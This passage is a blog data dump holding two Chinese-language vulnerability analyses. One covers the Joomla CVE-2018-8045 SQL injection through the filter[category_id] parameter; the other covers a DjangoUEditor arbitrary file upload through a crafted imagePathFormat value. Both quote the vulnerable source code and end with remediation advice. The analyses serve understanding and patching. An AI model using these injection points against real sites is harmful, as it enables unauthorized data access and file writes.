data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/6-5.png\"></p>\n<p>此时我们需要的filter[category_id]参数出现在了post参数中，通过这个参数的值，即可畅通无阻的进行注入。</p>\n<p>下面验证下这个filter[category_id]参部分可以直接传递给后台的$categoryId参数</p>\n<p>我们修改了filter[category_id]参数内容为’kingsguard_test’，并发包</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/7-4.png\"></p>\n<p>后台下断点，抓取$categoryId值，可见’kingsguard_test’原封不动的被传递给$categoryId参数，并拼接sql语句进行查询。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/8-4.png\"></p>\n<h2 id=\"利用验证\"><a href=\"#利用验证\" class=\"headerlink\" title=\"利用验证\"></a><strong>利用验证</strong></h2><p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/9-3.png\"></p>\n<h2 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h2><p>升级joomla至最新版本</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<hr>\n<p>如有意成为绿盟科技博客作者，欢迎进入作者群讨论！</p>\n<p>绿盟科技博客作者QQ群：695158981</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/WechatIMG749-150x150.png\"></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>绿盟科技博客作者微信群：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/WechatIMG68-226x300.jpeg\"></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<div class=\"wumii-hook\"></div>","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/security.jpg","excerpt":"<p>近日Joomla又爆出sql注入漏洞（CVE-2018-8045），让我们一起分析一下这个漏洞吧！</p>","more":"<h2 id=\"CVE-2018-8045-漏洞简介\"><a href=\"#CVE-2018-8045-漏洞简介\" class=\"headerlink\" title=\"CVE-2018-8045 漏洞简介\"></a>CVE-2018-8045 漏洞简介</h2><p>漏洞具体情况可参见绿盟科技安全威胁周报-201812周：</p>\n<p><a href=\"http://blog.nsfocus.net/nsfocus-201812/\">http://blog.nsfocus.net/nsfocus-201812/</a></p>\n<p><strong>Joomla! Core SQL注入漏洞</strong></p>\n<ul>\n<li><p>NSFOCUS ID</p>\n<ul>\n<li>39158</li>\n</ul>\n</li>\n<li><p>CVE ID</p>\n<ul>\n<li>CVE-2018-8045</li>\n</ul>\n</li>\n<li><p>受影响版本</p>\n<ul>\n<li>Joomla! Joomla! 3.5.0-3.8.5</li>\n</ul>\n</li>\n<li><p>漏洞点评</p>\n<ul>\n<li>Joomla是一套网站内容管理系统,使用PHP语言和MySQL数据库开发。Joomla! 3.5.0 -3.8.5版本对SQL语句内的变量缺少类型转换，导致User Notes列表视图内SQL注 入漏洞，可使攻击者访问或修改数据等。目前厂商已经发布了升级补丁，修复了这个 安全问题，请用户及时到厂商的主页下载。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"CVE-2018-8045-漏洞详情\"><a href=\"#CVE-2018-8045-漏洞详情\" class=\"headerlink\" title=\"CVE-2018-8045 漏洞详情\"></a><strong>CVE-2018-8045 漏洞详情</strong></h2><p>我们先看下joomla官网怎么说的：</p>\n<p><a href=\"https://developer.joomla.org/security-centre/723-20180301-core-sqli-vulnerability.html\">https://developer.joomla.org/security-centre/723-20180301-core-sqli-vulnerability.html</a></p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/%E5%9B%BE%E7%89%87-1-3.png\"></p>\n<p>User Notes模块由于缺少变量类型转换，导致sql注入的产生。这个漏洞在3.8.6版本被解决。</p>\n<p>漏洞介绍很模糊，单从介绍来看，根本不知道这个sql注入产生的位置。</p>\n<p>但是既然是3.8.6版本解决的，那我们就来从3.8.6版本的update包中找找思路。</p>\n<p>如下是github上joomla的releases列表</p>\n<p><a href=\"https://github.com/joomla/joomla-cms/releases\">https://github.com/joomla/joomla-cms/releases</a></p>\n<p>找到Update from Joomla! 3.8.5升级包下载，打开下载好的升级包，根据notes这个线索搜索下。果然，在升级包中看到了一个notes.php文件。</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/2-9.png\"></p>\n<p>我们回到github上，看下这个notes.php改动了什么。</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/3-9.png\"></p>\n<p>很明显，升级包中的notes.php中，对$categoryId的值进行了限制，强制转换为int类型，可以确定，这个漏洞就出在这里。</p>\n<p>在这里说个题外话，notes.php中getState方法出现过很多次，分别有</p>\n<p>getState(‘filter.search’)</p>\n<p>getState(‘filter.published’)</p>\n<p>getState(‘filter.category_id’)</p>\n<p>getState(‘filter.user_id’)</p>\n<p>getState(‘filter.level’)</p>\n<p>但是唯有getState(‘filter.category_id’)方法没有进行(int)类型转换，存在着漏洞隐患，这可能是开发者一时的疏忽吧。</p>\n<h2 id=\"CVE-2018-8045-漏洞分析\"><a href=\"#CVE-2018-8045-漏洞分析\" class=\"headerlink\" title=\"CVE-2018-8045 漏洞分析\"></a><strong>CVE-2018-8045 漏洞分析</strong></h2><p>来看下存在漏洞的代码：</p>\n<pre class=\"lang:default decode:true\">// Filter by a single or group of categories.\n$categoryId = $this-&gt;getState('filter.category_id');\n\nif ($categoryId &amp;&amp; is_scalar($categoryId))\n{\n   $query-&gt;where('a.catid = ' . $categoryId);\n}</pre>\n<p>$categoryId未经过滤直接拼接sql语句进行查询，造成了sql注入。</p>\n<p>但是$categoryId参数如何控制呢？</p>\n<p>存在漏洞的文件位于\\administrator\\components\\com_users\\models\\notes.php，是一个joomla的模型文件，它的控制器是\\administrator\\components\\com_users\\controllers\\notes.php</p>\n<p>我们登录joomla后台来看一下在哪里触发这个漏洞。</p>\n<p>访问<a href=\"http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes\">http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes</a> 即可触发该控制器。</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/4-8.png\"></p>\n<p>但是如何控制$categoryId参数呢？如果只访问</p>\n<p><a href=\"http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes\">http://xxx/joomla/administrator/index.php?option=com_users&amp;view=notes</a></p>\n<p>只会向服务器发送一个get请求，请求中根本不包含我们想要的categoryId参数</p>\n<p>先看下出问题的这行代码</p>\n<pre class=\"lang:default decode:true\">$categoryId = $this-&gt;getState('filter.category_id');</pre>\n<p>从getState(‘filter.category_id’)不难看出来，它的作用是一个过滤器，用来选择category_id的</p>\n<p>因此想向它传参，一定和高级搜索之类功能的有关。</p>\n<p>选择Search Tools选项 Select Category选项。</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/5-7.png\"></p>\n<p>此时joomla的发包情况</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/6-5.png\"></p>\n<p>此时我们需要的filter[category_id]参数出现在了post参数中，通过这个参数的值，即可畅通无阻的进行注入。</p>\n<p>下面验证下这个filter[category_id]参部分可以直接传递给后台的$categoryId参数</p>\n<p>我们修改了filter[category_id]参数内容为’kingsguard_test’，并发包</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/7-4.png\"></p>\n<p>后台下断点，抓取$categoryId值，可见’kingsguard_test’原封不动的被传递给$categoryId参数，并拼接sql语句进行查询。</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/8-4.png\"></p>\n<h2 id=\"利用验证\"><a href=\"#利用验证\" class=\"headerlink\" title=\"利用验证\"></a><strong>利用验证</strong></h2><p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/9-3.png\"></p>\n<h2 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h2><p>升级joomla至最新版本</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<hr>\n<p>如有意成为绿盟科技博客作者，欢迎进入作者群讨论！</p>\n<p>绿盟科技博客作者QQ群：695158981</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/WechatIMG749-150x150.png\"></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>绿盟科技博客作者微信群：</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2018/03/WechatIMG68-226x300.jpeg\"></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<div class=\"wumii-hook\"></div>"},{"title":"DjangoUEditor任意文件上传漏洞分析","date":"2018-05-18T17:27:03.000Z","cover":"https://s1.ax1x.com/2020/03/19/8sTqVP.md.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"Django是Python世界最有影响力的web框架。\n\nDjangoUeditor是一款可以在Django应用中集成百度Ueditor HTML编辑器的插件（Ueditor HTML编辑器是百度开源的在线HTML编辑器）。\n\nDjangoUeditor插件上存在一个漏洞，可以导致任意文件上传。\n<!--more-->\n</br>\n\n### 影响版本\nDjangoUeditor < 1.9.143\n</br>\n### 漏洞分析\n最近在学习分析python web框架方面的漏洞，恰好看到了WooYun 上2015年的一个关于DjangoUeditor的漏洞，就拿来分析一下。\n\n不要看这个漏洞距今已经快两年了，笔者认为这个漏洞还是有分析的价值的，因为DjangoUeditor作为一个由百度开发的富文本编辑器Ueditor移植到Django中的组件，它的使用率还是挺高的；再者，DjangoUeditor于2015年1月17号后，再也没有更新过，见github上作者的说明：\n<div align=\"center\">{% asset_img 1.jpg%}</div>\n经笔者测试，现在可以下载使用的1.9.143版本中，依然存在着这个漏洞。因此这个漏洞依然有着一定的影响的。\n\n下面开始正式分析下这个漏洞，根据wooyun上的说明，可以在利用这个插件进行上传图片时，改变imagePathFormat变量的值，即可上传任意文件。\n\n搭建好环境后，来看一下后台的样式，如下图所示\n<div align=\"center\">{% asset_img 2.jpg%}</div>\n我们来传一张图片并抓包看一下，如下图所示：\n<div align=\"center\">{% asset_img 3.jpg%}</div>\n注意图中两处红圈处，其中一处便是wooyun中提到的imagePathFormat参数，另一处action参数，这个参数在下文中会用到。\n\n可以看出，当上传一个图片（或者是文件）时候，POST提交的路径是/ueditor/controller/，我们看看DjangoUeditor的路由怎么定义的，来看一下后台代码DjangoUeditor/urls.py\n```python\n#coding:utf-8\nfrom django import VERSION\nif VERSION[0:2]>(1,3):\n    from django.conf.urls import patterns, url\nelse:\n    from django.conf.urls.defaults import patterns, url\n\nfrom views import get_ueditor_controller\nurlpatterns = patterns('',\n    url(r'^controller/$',get_ueditor_controller)\n)\n```\n从urls.py中可以看到，路由定义到views.py中的get_ueditor_controller方法上去了\n接下来跟到views.py中去，找到get_ueditor_controller方法\n```python\ndef get_ueditor_controller(request):\n    \"\"\"获取ueditor的后端URL地址    \"\"\"\n    action=request.GET.get(\"action\",\"\")\n    reponseAction={\n        \"config\":get_ueditor_settings,\n        \"uploadimage\":UploadFile,\n        \"uploadscrawl\":UploadFile,\n        \"uploadvideo\":UploadFile,\n        \"uploadfile\":UploadFile,\n        \"catchimage\":catcher_remote_image,\n        \"listimage\":list_files,\n        \"listfile\":list_files\n    }\n    return reponseAction[action](request)\n```\n传入的action参数值是uploadimage，因此接下来return进入对应的UploadFile方法\n\n跟到UploadFile方法中看一看（已省略中间若干代码）\n```python\nef UploadFile(request):\n    \"\"\"上传文件\"\"\"\n    。。。。。。。。。。。。。。。。\n   \n    #检测保存路径是否存在,如果不存在则需要创建\n    upload_path_format={\n        \"uploadfile\":\"filePathFormat\",\n        \"uploadimage\":\"imagePathFormat\",\n        \"uploadscrawl\":\"scrawlPathFormat\",\n        \"uploadvideo\":\"videoPathFormat\"\n    }\n\n    path_format_var=get_path_format_vars()\n    path_format_var.update({\n        \"basename\":upload_original_name,\n        \"extname\":upload_original_ext[1:],\n        \"filename\":upload_file_name,\n    })\n    #取得输出文件的路径  OutputPathFormat,OutputPath,OutputFile=get_output_path(request,upload_path_format[action],path_format_var)\n```\n注意最后一行，在这里调用了一个get_output_path方法来获得输出文件路径以及各式话后的文件名。\n\n为什么要注意这个get_output_path方法呢？回想一下，这个漏洞注入点是什么？是imagePathFormat参数，这里传入get_output_path方法的第二个参数upload_path_format[action]值是什么？见下图。\n<div align=\"center\">{% asset_img 4.jpg%}</div>\n当action参数值是uploadimage时，upload_path_format[action]值为 imagePathFormat，imagePathFormat将作为第二个参数的值进入get_output_path方法。\n\n接下来跟进get_output_path方法\n```python\ndef get_output_path(request,path_format,path_format_var):\n    #取得输出文件的路径\n    OutputPathFormat=(request.GET.get(path_format,USettings.UEditorSettings[\"defaultPathFormat\"]) % path_format_var).replace(\"\\\\\",\"/\")\n    OutputPath,OutputFile=os.path.split(OutputPathFormat)\n    OutputPath=os.path.join(USettings.gSettings.MEDIA_ROOT,OutputPath)\n    if not OutputFile:#如果OutputFile为空说明传入的OutputPathFormat没有包含文件名，因此需要用默认的文件名\n        OutputFile=USettings.UEditorSettings[\"defaultPathFormat\"] % path_format_var\n        OutputPathFormat=os.path.join(OutputPathFormat,OutputFile)\n    if not os.path.exists(OutputPath):\n        os.makedirs(OutputPath)\n    return ( OutputPathFormat,OutputPath,OutputFile)\n```\n现在path_format的值为imagePathFormat，django中的request.GET.get()方法可以跟两个参数，如果get中可以取得第一个参数的值，则使用第一个的值，如果取不到，则使用第二个配置到的默认值。经过处理后OutputPathFormat的值为uploads/images。\n\n接下来用os.path.split来将路径和文件名分割，然后分别赋值给OutputPath,OutputFile\n\n下面就到了漏洞存在的地方了，往下看，下面会判断OutputFile是否为空，为空的话就用标准模板进行格式化，我们这里OutputFile显然为空，最终的文件名会返回一个格式化的名字，如下图\n<div align=\"center\">{% asset_img 5.jpg%}</div>\n具体格式化方法如下：\n```python\ndef get_path_format_vars():\n    return {\n        \"year\":datetime.datetime.now().strftime(\"%Y\"),\n        \"month\":datetime.datetime.now().strftime(\"%m\"),\n        \"day\":datetime.datetime.now().strftime(\"%d\"),\n        \"date\": datetime.datetime.now().strftime(\"%Y%m%d\"),\n        \"time\":datetime.datetime.now().strftime(\"%H%M%S\"),\n        \"datetime\":datetime.datetime.now().strftime(\"%Y%m%d%H%M%S\"),\n        \"rnd\":random.randrange(100,999)\n    }\n```\n但是，如果我们构造的imagePathFormat参数中的值不是一个单纯的路径，而是一个包含文件名的参数呢？（如imagePathFormat = uploads%2Fimages%2Fhehehe.xxxx）\n显而易见，OutputFile就是我们构造的hehehe.xxxx。\n验证如下\n<div align=\"center\">{% asset_img 6.jpg%}</div>\n经验证，写入的路径也是可以控制的，不仅限于images路径，并且可以覆盖其他的文件。\n</br>\n### 修补防御\n可以通过修改代码，对用户上传的OutputFile类型进行过滤，只允许符合要求的类型进行上传。\n\n","source":"_posts/diango.md","raw":"---\ntitle: DjangoUEditor任意文件上传漏洞分析\ndate: 2018-05-19 01:27:03\ntags: web漏洞分析\ncategories: 技术\ncover: https://s1.ax1x.com/2020/03/19/8sTqVP.md.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\nDjango是Python世界最有影响力的web框架。\n\nDjangoUeditor是一款可以在Django应用中集成百度Ueditor HTML编辑器的插件（Ueditor HTML编辑器是百度开源的在线HTML编辑器）。\n\nDjangoUeditor插件上存在一个漏洞，可以导致任意文件上传。\n<!--more-->\n</br>\n\n### 影响版本\nDjangoUeditor < 1.9.143\n</br>\n### 漏洞分析\n最近在学习分析python web框架方面的漏洞，恰好看到了WooYun 上2015年的一个关于DjangoUeditor的漏洞，就拿来分析一下。\n\n不要看这个漏洞距今已经快两年了，笔者认为这个漏洞还是有分析的价值的，因为DjangoUeditor作为一个由百度开发的富文本编辑器Ueditor移植到Django中的组件，它的使用率还是挺高的；再者，DjangoUeditor于2015年1月17号后，再也没有更新过，见github上作者的说明：\n<div align=\"center\">{% asset_img 1.jpg%}</div>\n经笔者测试，现在可以下载使用的1.9.143版本中，依然存在着这个漏洞。因此这个漏洞依然有着一定的影响的。\n\n下面开始正式分析下这个漏洞，根据wooyun上的说明，可以在利用这个插件进行上传图片时，改变imagePathFormat变量的值，即可上传任意文件。\n\n搭建好环境后，来看一下后台的样式，如下图所示\n<div align=\"center\">{% asset_img 2.jpg%}</div>\n我们来传一张图片并抓包看一下，如下图所示：\n<div align=\"center\">{% asset_img 3.jpg%}</div>\n注意图中两处红圈处，其中一处便是wooyun中提到的imagePathFormat参数，另一处action参数，这个参数在下文中会用到。\n\n可以看出，当上传一个图片（或者是文件）时候，POST提交的路径是/ueditor/controller/，我们看看DjangoUeditor的路由怎么定义的，来看一下后台代码DjangoUeditor/urls.py\n```python\n#coding:utf-8\nfrom django import VERSION\nif VERSION[0:2]>(1,3):\n    from django.conf.urls import patterns, url\nelse:\n    from django.conf.urls.defaults import patterns, url\n\nfrom views import get_ueditor_controller\nurlpatterns = patterns('',\n    url(r'^controller/$',get_ueditor_controller)\n)\n```\n从urls.py中可以看到，路由定义到views.py中的get_ueditor_controller方法上去了\n接下来跟到views.py中去，找到get_ueditor_controller方法\n```python\ndef get_ueditor_controller(request):\n    \"\"\"获取ueditor的后端URL地址    \"\"\"\n    action=request.GET.get(\"action\",\"\")\n    reponseAction={\n        \"config\":get_ueditor_settings,\n        \"uploadimage\":UploadFile,\n        \"uploadscrawl\":UploadFile,\n        \"uploadvideo\":UploadFile,\n        \"uploadfile\":UploadFile,\n        \"catchimage\":catcher_remote_image,\n        \"listimage\":list_files,\n        \"listfile\":list_files\n    }\n    return reponseAction[action](request)\n```\n传入的action参数值是uploadimage，因此接下来return进入对应的UploadFile方法\n\n跟到UploadFile方法中看一看（已省略中间若干代码）\n```python\nef UploadFile(request):\n    \"\"\"上传文件\"\"\"\n    。。。。。。。。。。。。。。。。\n   \n    #检测保存路径是否存在,如果不存在则需要创建\n    upload_path_format={\n        \"uploadfile\":\"filePathFormat\",\n        \"uploadimage\":\"imagePathFormat\",\n        \"uploadscrawl\":\"scrawlPathFormat\",\n        \"uploadvideo\":\"videoPathFormat\"\n    }\n\n    path_format_var=get_path_format_vars()\n    path_format_var.update({\n        \"basename\":upload_original_name,\n        \"extname\":upload_original_ext[1:],\n        \"filename\":upload_file_name,\n    })\n    #取得输出文件的路径  OutputPathFormat,OutputPath,OutputFile=get_output_path(request,upload_path_format[action],path_format_var)\n```\n注意最后一行，在这里调用了一个get_output_path方法来获得输出文件路径以及各式话后的文件名。\n\n为什么要注意这个get_output_path方法呢？回想一下，这个漏洞注入点是什么？是imagePathFormat参数，这里传入get_output_path方法的第二个参数upload_path_format[action]值是什么？见下图。\n<div align=\"center\">{% asset_img 4.jpg%}</div>\n当action参数值是uploadimage时，upload_path_format[action]值为 imagePathFormat，imagePathFormat将作为第二个参数的值进入get_output_path方法。\n\n接下来跟进get_output_path方法\n```python\ndef get_output_path(request,path_format,path_format_var):\n    #取得输出文件的路径\n    OutputPathFormat=(request.GET.get(path_format,USettings.UEditorSettings[\"defaultPathFormat\"]) % path_format_var).replace(\"\\\\\",\"/\")\n    OutputPath,OutputFile=os.path.split(OutputPathFormat)\n    OutputPath=os.path.join(USettings.gSettings.MEDIA_ROOT,OutputPath)\n    if not OutputFile:#如果OutputFile为空说明传入的OutputPathFormat没有包含文件名，因此需要用默认的文件名\n        OutputFile=USettings.UEditorSettings[\"defaultPathFormat\"] % path_format_var\n        OutputPathFormat=os.path.join(OutputPathFormat,OutputFile)\n    if not os.path.exists(OutputPath):\n        os.makedirs(OutputPath)\n    return ( OutputPathFormat,OutputPath,OutputFile)\n```\n现在path_format的值为imagePathFormat，django中的request.GET.get()方法可以跟两个参数，如果get中可以取得第一个参数的值，则使用第一个的值，如果取不到，则使用第二个配置到的默认值。经过处理后OutputPathFormat的值为uploads/images。\n\n接下来用os.path.split来将路径和文件名分割，然后分别赋值给OutputPath,OutputFile\n\n下面就到了漏洞存在的地方了，往下看，下面会判断OutputFile是否为空，为空的话就用标准模板进行格式化，我们这里OutputFile显然为空，最终的文件名会返回一个格式化的名字，如下图\n<div align=\"center\">{% asset_img 5.jpg%}</div>\n具体格式化方法如下：\n```python\ndef get_path_format_vars():\n    return {\n        \"year\":datetime.datetime.now().strftime(\"%Y\"),\n        \"month\":datetime.datetime.now().strftime(\"%m\"),\n        \"day\":datetime.datetime.now().strftime(\"%d\"),\n        \"date\": datetime.datetime.now().strftime(\"%Y%m%d\"),\n        \"time\":datetime.datetime.now().strftime(\"%H%M%S\"),\n        \"datetime\":datetime.datetime.now().strftime(\"%Y%m%d%H%M%S\"),\n        \"rnd\":random.randrange(100,999)\n    }\n```\n但是，如果我们构造的imagePathFormat参数中的值不是一个单纯的路径，而是一个包含文件名的参数呢？（如imagePathFormat = uploads%2Fimages%2Fhehehe.xxxx）\n显而易见，OutputFile就是我们构造的hehehe.xxxx。\n验证如下\n<div align=\"center\">{% asset_img 6.jpg%}</div>\n经验证，写入的路径也是可以控制的，不仅限于images路径，并且可以覆盖其他的文件。\n</br>\n### 修补防御\n可以通过修改代码，对用户上传的OutputFile类型进行过滤，只允许符合要求的类型进行上传。\n\n","slug":"diango","published":1,"updated":"2020-10-27T09:25:32.965Z","_id":"ckgrozu97002xwsa982y438i7","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Django是Python世界最有影响力的web框架。</p>\n<p>DjangoUeditor是一款可以在Django应用中集成百度Ueditor HTML编辑器的插件（Ueditor HTML编辑器是百度开源的在线HTML编辑器）。</p>\n<p>DjangoUeditor插件上存在一个漏洞，可以导致任意文件上传。</p>\n<a id=\"more\"></a>\n</br>\n\n<h3 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h3><p>DjangoUeditor &lt; 1.9.143<br></br></p>\n<h3 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h3><p>最近在学习分析python web框架方面的漏洞，恰好看到了WooYun 上2015年的一个关于DjangoUeditor的漏洞，就拿来分析一下。</p>\n<p>不要看这个漏洞距今已经快两年了，笔者认为这个漏洞还是有分析的价值的，因为DjangoUeditor作为一个由百度开发的富文本编辑器Ueditor移植到Django中的组件，它的使用率还是挺高的；再者，DjangoUeditor于2015年1月17号后，再也没有更新过，见github上作者的说明：</p>\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/diango/1.jpg\" class=\"\"></div>\n经笔者测试，现在可以下载使用的1.9.143版本中，依然存在着这个漏洞。因此这个漏洞依然有着一定的影响的。\n\n<p>下面开始正式分析下这个漏洞，根据wooyun上的说明，可以在利用这个插件进行上传图片时，改变imagePathFormat变量的值，即可上传任意文件。</p>\n<p>搭建好环境后，来看一下后台的样式，如下图所示</p>\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/diango/2.jpg\" class=\"\"></div>\n我们来传一张图片并抓包看一下，如下图所示：\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/diango/3.jpg\" class=\"\"></div>\n注意图中两处红圈处，其中一处便是wooyun中提到的imagePathFormat参数，另一处action参数，这个参数在下文中会用到。\n\n<p>可以看出，当上传一个图片（或者是文件）时候，POST提交的路径是/ueditor/controller/，我们看看DjangoUeditor的路由怎么定义的，来看一下后台代码DjangoUeditor/urls.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> django <span class=\"keyword\">import</span> VERSION</span><br><span class=\"line\"><span class=\"keyword\">if</span> VERSION[<span class=\"number\">0</span>:<span class=\"number\">2</span>]&gt;(<span class=\"number\">1</span>,<span class=\"number\">3</span>):</span><br><span class=\"line\">    <span class=\"keyword\">from</span> django.conf.urls <span class=\"keyword\">import</span> patterns, url</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"keyword\">from</span> django.conf.urls.defaults <span class=\"keyword\">import</span> patterns, url</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> views <span class=\"keyword\">import</span> get_ueditor_controller</span><br><span class=\"line\">urlpatterns = patterns(<span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    url(<span class=\"string\">r&#x27;^controller/$&#x27;</span>,get_ueditor_controller)</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>从urls.py中可以看到，路由定义到views.py中的get_ueditor_controller方法上去了<br>接下来跟到views.py中去，找到get_ueditor_controller方法</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_ueditor_controller</span>(<span class=\"params\">request</span>):</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;获取ueditor的后端URL地址    &quot;&quot;&quot;</span></span><br><span class=\"line\">    action=request.GET.get(<span class=\"string\">&quot;action&quot;</span>,<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    reponseAction=&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;config&quot;</span>:get_ueditor_settings,</span><br><span class=\"line\">        <span class=\"string\">&quot;uploadimage&quot;</span>:UploadFile,</span><br><span class=\"line\">        <span class=\"string\">&quot;uploadscrawl&quot;</span>:UploadFile,</span><br><span class=\"line\">        <span class=\"string\">&quot;uploadvideo&quot;</span>:UploadFile,</span><br><span class=\"line\">        <span class=\"string\">&quot;uploadfile&quot;</span>:UploadFile,</span><br><span class=\"line\">        <span class=\"string\">&quot;catchimage&quot;</span>:catcher_remote_image,</span><br><span class=\"line\">        <span class=\"string\">&quot;listimage&quot;</span>:list_files,</span><br><span class=\"line\">        <span class=\"string\">&quot;listfile&quot;</span>:list_files</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> reponseAction[action](request)</span><br></pre></td></tr></table></figure>\n<p>传入的action参数值是uploadimage，因此接下来return进入对应的UploadFile方法</p>\n<p>跟到UploadFile方法中看一看（已省略中间若干代码）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ef UploadFile(request):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;上传文件&quot;&quot;&quot;</span></span><br><span class=\"line\">    。。。。。。。。。。。。。。。。</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"comment\">#检测保存路径是否存在,如果不存在则需要创建</span></span><br><span class=\"line\">    upload_path_format=&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;uploadfile&quot;</span>:<span class=\"string\">&quot;filePathFormat&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;uploadimage&quot;</span>:<span class=\"string\">&quot;imagePathFormat&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;uploadscrawl&quot;</span>:<span class=\"string\">&quot;scrawlPathFormat&quot;</span>,</span><br><span 